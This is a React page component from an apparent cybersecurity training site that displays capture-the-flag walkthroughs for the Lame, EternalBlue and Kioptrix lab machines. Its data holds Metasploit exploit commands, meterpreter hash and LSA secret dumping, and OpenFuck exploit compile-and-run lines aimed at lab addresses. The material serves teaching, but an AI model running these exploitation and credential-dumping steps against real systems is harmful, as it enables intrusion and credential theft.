'use client';

import { useState } from 'react';
import Link from 'next/link';
import { 
  Search, 
  Copy, 
  Check, 
  Filter
} from 'lucide-react';
import { CyberSmokeHeader } from '@/components/CyberSmokeHeader';

interface WalkthroughStep {
  phase: string;
  title: string;
  description: string;
  command?: string;
  findings?: string[];
}

interface MachineWalkthrough {
  id: string;
  title: string;
  platform: 'HackTheBox' | 'TryHackMe' | 'VulnHub' | 'CyberMatrix';
  os: 'Linux' | 'Windows';
  difficulty: 'EASY' | 'MEDIUM' | 'HARD' | 'INSANE';
  ip: string;
  points: number;
  author: string;
  summary: string;
  tags: string[];
  steps: WalkthroughStep[];
  rootFlag: string;
}

const WALKTHROUGHS_DATA: MachineWalkthrough[] = [
  {
    id: 'htb-lame',
    title: 'LAME - Samba Symlink & Distcc Exploitation',
    platform: 'HackTheBox',
    os: 'Linux',
    difficulty: 'EASY',
    ip: '10.10.10.3',
    points: 20,
    author: 'Ninad Pawar',
    summary: 'A classic beginner machine demonstrating vulnerable Samba 3.0.20 username map script execution and unauthenticated Distcc RCE.',
    tags: ['Samba', 'Distcc', 'Metasploit', 'CVE-2007-2447'],
    rootFlag: 'HTB{s4mb4_3xpl01t_r00t_0wn3d}',
    steps: [
      {
        phase: '01. RECONNAISSANCE',
        title: 'Initial Port Scan & Service Fingerprinting',
        description: 'Perform a comprehensive TCP port scan using Nmap to identify running services and version numbers.',
        command: 'nmap -sC -sV -p- -T4 10.10.10.3',
        findings: [
          'Port 21: vsftpd 2.3.4 (Anonymous FTP allowed)',
          'Port 22: OpenSSH 4.7p1 Debian 8ubuntu1',
          'Port 139/445: Samba 3.0.20-Debian'
        ]
      },
      {
        phase: '02. VULNERABILITY ANALYSIS',
        title: 'Identifying Samba CVE-2007-2447 Command Injection',
        description: 'Samba version 3.0.20 is vulnerable to arbitrary command execution via MS-RPC shell metacharacters in username parameters.',
        command: 'use exploit/multi/samba/usermap_script\nset RHOSTS 10.10.10.3\nset LHOST 10.10.14.2\nexploit'
      },
      {
        phase: '03. EXPLOITATION & ROOT FOOTHOLD',
        title: 'Executing Payload & Capturing Root Flag',
        description: 'Once executed, the Samba daemon drops an interactive root shell without requiring privilege escalation.',
        command: 'cat /root/root.txt',
        findings: ['Root shell obtained with uid=0(root) gid=0(root)']
      }
    ]
  },
  {
    id: 'thm-eternalblue',
    title: 'ETERNALBLUE - MS17-010 Kernel Exploitation',
    platform: 'TryHackMe',
    os: 'Windows',
    difficulty: 'EASY',
    ip: '10.10.185.74',
    points: 25,
    author: 'Ninad Pawar',
    summary: 'Exploiting SMBv1 memory corruption vulnerability (MS17-010 / DoublePulsar) to gain NT AUTHORITY\\SYSTEM access on Windows 7/Server 2008.',
    tags: ['MS17-010', 'EternalBlue', 'SMBv1', 'Mimikatz'],
    rootFlag: 'THM{ms17_010_pwn3d_syst3m_p0w3r}',
    steps: [
      {
        phase: '01. RECONNAISSANCE',
        title: 'Scanning SMB Service Vulnerabilities',
        description: 'Use Nmap NSE scripts to confirm the target is vulnerable to MS17-010.',
        command: 'nmap -p 445 --script smb-vuln-ms17-010 10.10.185.74',
        findings: ['Host is VULNERABLE to Remote Code Execution vulnerability (MS17-010)']
      },
      {
        phase: '02. EXPLOITATION',
        title: 'Launching EternalBlue Payload via Metasploit',
        description: 'Configure the exploit module and target architecture to spawn Meterpreter shell.',
        command: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.185.74\nrun'
      },
      {
        phase: '03. POST EXPLOITATION',
        title: 'Dumping LSA Secrets & Harvesting Hashes',
        description: 'Migrate to a stable x64 process (lsass.exe) and dump password hashes using Mimikatz.',
        command: 'meterpreter > hashdump\nmeterpreter > load kiwi\nmeterpreter > lsadump'
      }
    ]
  },
  {
    id: 'htb-kioptrix',
    title: 'KIOPTRIX v1 - OpenSSL & Mod_SSL Exploitation',
    platform: 'VulnHub',
    os: 'Linux',
    difficulty: 'MEDIUM',
    ip: '192.168.1.105',
    points: 35,
    author: 'Ninad Pawar',
    summary: 'Classic Linux OSCP-like box involving Apache mod_ssl buffer overflow (OpenFuck) and trans2open Samba exploit.',
    tags: ['Apache', 'OpenSSL', 'Mod_SSL', 'Buffer Overflow'],
    rootFlag: 'VULNHUB{k10ptr1x_v1_r00t_m4st3r}',
    steps: [
      {
        phase: '01. RECONNAISSANCE',
        title: 'Service Enumeration & Apache SSL Version Check',
        description: 'Enumerate web daemon extensions and mod_ssl versions.',
        command: 'nmap -sV -p 80,443,139 192.168.1.105',
        findings: ['Apache 1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b']
      },
      {
        phase: '02. EXPLOITATION',
        title: 'Compiling & Executing OpenFuck Buffer Overflow',
        description: 'Compile legacy OpenFuck.c C source code against OpenSSL header files.',
        command: 'gcc -o openfuck OpenFuck.c -lcrypto\n./openfuck 0x6b 192.168.1.105 443 -c 40'
      }
    ]
  }
];

const NAV_BUTTONS = [
  { name: 'ROADMAP', href: '/roadmap' },
  { name: 'COURSES', href: '/courses' },
  { name: 'WALKTHROUGH', href: '/walkthroughs' },
  { name: 'CVE', href: '/cve' },
  { name: 'CERTIFICATE', href: '/certificate' }
];

export default function WalkthroughsPage() {
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedDifficulty, setSelectedDifficulty] = useState<string>('ALL');
  const [selectedWalkthrough, setSelectedWalkthrough] = useState<MachineWalkthrough | null>(WALKTHROUGHS_DATA[0]);
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(text);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const filteredWalkthroughs = WALKTHROUGHS_DATA.filter((w) => {
    const matchesSearch =
      w.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      w.tags.some((t) => t.toLowerCase().includes(searchQuery.toLowerCase())) ||
      w.platform.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesDiff = selectedDifficulty === 'ALL' || w.difficulty === selectedDifficulty;
    return matchesSearch && matchesDiff;
  });

  return (
    <div className="min-h-screen bg-[#141b2c] text-zinc-100 font-sans selection:bg-cyan-500/30 selection:text-cyan-300 flex flex-col justify-between">
      
      <div>
        {/* 1. Global Smoke Header */}
        <CyberSmokeHeader />

        {/* 2. Top Navigation Sub-Header */}
        <div className="bg-[#0f1422] border-b border-zinc-800/80 sticky top-0 z-40">
          <div className="max-w-7xl mx-auto px-4 md:px-8 h-14 flex items-center justify-between gap-4">
            
            <div className="flex items-center space-x-4 sm:space-x-8 text-xs font-mono tracking-wider font-bold overflow-x-auto no-scrollbar">
              {NAV_BUTTONS.map((btn) => {
                const isActive = btn.name === 'WALKTHROUGH';
                return (
                  <Link
                    key={btn.name}
                    href={btn.href}
                    className={`py-4 transition-all relative shrink-0 ${
                      isActive 
                        ? 'text-[#38bdf8] font-extrabold' 
                        : 'text-zinc-400 hover:text-zinc-100'
                    }`}
                  >
                    <span>{btn.name}</span>
                    {isActive && (
                      <div className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#38bdf8] shadow-[0_0_10px_rgba(56,189,248,0.9)]"></div>
                    )}
                  </Link>
                );
              })}
            </div>

            <div className="flex items-center space-x-2 shrink-0">
              <div className="relative w-36 sm:w-60 md:w-64">
                <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="SEARCH_WALKTHROUGHS..."
                  className="w-full pl-9 pr-3 py-1.5 bg-[#171e30] border border-zinc-700/60 rounded-md text-xs font-mono text-zinc-200 placeholder-zinc-500 focus:outline-none focus:border-[#38bdf8] transition"
                />
              </div>
              <button 
                className="p-2 rounded-md bg-[#171e30] border border-zinc-700/60 text-zinc-400 hover:text-[#38bdf8] transition hover:border-[#38bdf8]/40 cursor-pointer"
                title="Filter Walkthroughs"
              >
                <Filter className="w-3.5 h-3.5" />
              </button>
            </div>

          </div>
        </div>

        {/* 3. Main Workspace */}
        <main className="max-w-7xl mx-auto px-4 md:px-8 py-8 flex flex-col lg:flex-row gap-8">
          
          {/* Target List Sidebar */}
          <aside className="w-full lg:w-96 shrink-0 space-y-4">
            
            <div className="flex items-center justify-between pb-2 border-b border-zinc-800">
              <span className="text-xs font-mono font-bold text-zinc-400">
                TARGET MACHINES ({filteredWalkthroughs.length})
              </span>
              
              <div className="flex items-center space-x-1">
                {['ALL', 'EASY', 'MEDIUM'].map((diff) => (
                  <button
                    key={diff}
                    onClick={() => setSelectedDifficulty(diff)}
                    className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold transition ${
                      selectedDifficulty === diff 
                        ? 'bg-[#38bdf8] text-black' 
                        : 'bg-zinc-800 text-zinc-400 hover:text-white'
                    }`}
                  >
                    {diff}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-3">
              {filteredWalkthroughs.map((item) => {
                const isSelected = selectedWalkthrough?.id === item.id;

                return (
                  <div
                    key={item.id}
                    onClick={() => setSelectedWalkthrough(item)}
                    className={`p-4 rounded-xl border transition-all cursor-pointer ${
                      isSelected
                        ? 'bg-[#101726] border-[#38bdf8] shadow-[0_0_20px_rgba(56,189,248,0.15)]'
                        : 'bg-[#0f1524] border-zinc-800 hover:border-zinc-700'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="px-2 py-0.5 rounded bg-zinc-950 border border-zinc-700 text-[10px] font-mono font-bold text-cyan-300">
                        {item.platform}
                      </span>
                      <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded ${
                        item.difficulty === 'EASY' 
                          ? 'text-emerald-400 bg-emerald-500/10 border border-emerald-500/20' 
                          : 'text-amber-400 bg-amber-500/10 border border-amber-500/20'
                      }`}>
                        {item.difficulty}
                      </span>
                    </div>

                    <h3 className="text-sm font-bold text-white mb-1 line-clamp-1">
                      {item.title}
                    </h3>

                    <p className="text-xs text-zinc-400 line-clamp-2 mb-3">
                      {item.summary}
                    </p>

                    <div className="flex flex-wrap gap-1">
                      {item.tags.map((tag) => (
                        <span key={tag} className="text-[9.5px] font-mono px-1.5 py-0.5 rounded bg-zinc-950 text-zinc-500 border border-zinc-800">
                          #{tag}
                        </span>
                      ))}
                    </div>
                  </div>
                );
              })}
            </div>

          </aside>

          {/* Walkthrough Guide Details */}
          {selectedWalkthrough && (
            <section className="flex-1 rounded-2xl bg-[#0f1524] border border-zinc-800 p-6 space-y-6">
              
              <div className="pb-6 border-b border-zinc-800">
                <div className="flex items-center justify-between gap-2 mb-3">
                  <div className="flex items-center space-x-2">
                    <span className="px-2.5 py-1 rounded bg-cyan-500/10 border border-cyan-400/40 text-cyan-300 text-xs font-mono font-bold">
                      {selectedWalkthrough.platform}
                    </span>
                    <span className="px-2.5 py-1 rounded bg-zinc-900 border border-zinc-700 text-zinc-300 text-xs font-mono font-bold">
                      OS: {selectedWalkthrough.os}
                    </span>
                    <span className="px-2.5 py-1 rounded bg-zinc-900 border border-zinc-700 text-zinc-300 text-xs font-mono font-bold">
                      IP: {selectedWalkthrough.ip}
                    </span>
                  </div>

                  <div className="text-xs font-mono text-[#38bdf8] font-bold">
                    +{selectedWalkthrough.points} PTS
                  </div>
                </div>

                <h1 className="text-2xl font-black text-white">
                  {selectedWalkthrough.title}
                </h1>

                <p className="text-xs text-zinc-400 mt-2 font-mono">
                  Architected by: <span className="text-cyan-300 font-bold">{selectedWalkthrough.author}</span> // Lead Security Architect
                </p>
              </div>

              <div className="space-y-6">
                {selectedWalkthrough.steps.map((step, idx) => (
                  <div key={idx} className="p-5 rounded-xl bg-[#141b2c] border border-zinc-800/80 space-y-3">
                    
                    <span className="text-xs font-mono font-bold text-[#38bdf8] tracking-wider block">
                      {step.phase}
                    </span>

                    <h3 className="text-base font-bold text-white">
                      {step.title}
                    </h3>

                    <p className="text-xs text-zinc-300 leading-relaxed">
                      {step.description}
                    </p>

                    {step.findings && (
                      <div className="my-2 space-y-1">
                        {step.findings.map((f, fIdx) => (
                          <div key={fIdx} className="text-xs font-mono text-emerald-400 flex items-center space-x-2">
                            <span>▸</span>
                            <span>{f}</span>
                          </div>
                        ))}
                      </div>
                    )}

                    {step.command && (
                      <div className="relative mt-3 rounded-lg bg-black border border-zinc-800 p-3 font-mono text-xs text-cyan-300">
                        <button
                          onClick={() => handleCopy(step.command!)}
                          className="absolute right-2.5 top-2.5 p-1 rounded bg-zinc-900 hover:bg-zinc-800 text-zinc-400 hover:text-white transition"
                          title="Copy Command"
                        >
                          {copiedCode === step.command ? (
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                        </button>
                        <pre className="whitespace-pre-wrap pr-8">{step.command}</pre>
                      </div>
                    )}

                  </div>
                ))}
              </div>

              {/* Root Flag Box */}
              <div className="p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 via-zinc-900 to-zinc-950 border border-emerald-500/40 flex items-center justify-between font-mono">
                <div>
                  <p className="text-[10px] text-emerald-400 font-bold uppercase tracking-wider">
                    PROOF OF OWNERSHIP (ROOT FLAG):
                  </p>
                  <p className="text-sm font-black text-white mt-0.5">
                    {selectedWalkthrough.rootFlag}
                  </p>
                </div>
                <button
                  onClick={() => handleCopy(selectedWalkthrough.rootFlag)}
                  className="px-3 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs transition"
                >
                  COPY FLAG
                </button>
              </div>

            </section>
          )}

        </main>
      </div>

      {/* 4. Footer */}
      <footer className="border-t border-zinc-800/60 bg-[#0d121e] py-8 text-center text-xs font-mono text-zinc-500">
        CYBERMATRIX ACADEMY // ARCHITECTED BY NINAD PAWAR // DEFENSE MATRIX ACTIVE
      </footer>

    </div>
  );
}